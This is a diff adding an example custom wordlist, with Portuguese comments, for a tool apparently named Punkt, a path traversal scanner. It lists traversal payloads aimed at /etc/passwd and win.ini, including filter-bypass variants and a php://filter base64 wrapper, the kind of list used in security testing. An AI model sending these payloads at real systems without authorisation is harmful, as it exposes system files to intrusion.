@@ -1,0 +1,9 @@
+# Exemplo de wordlist customizada para o Punkt (-w wordlists/custom_example.txt)
+# Uma entrada por linha. Linhas começando com # são ignoradas.
+../../../../etc/passwd
+../../../../../etc/passwd
+....//....//....//etc/passwd
+..;/..;/..;/etc/passwd
+/etc/passwd
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+..\..\..\windows\win.ini
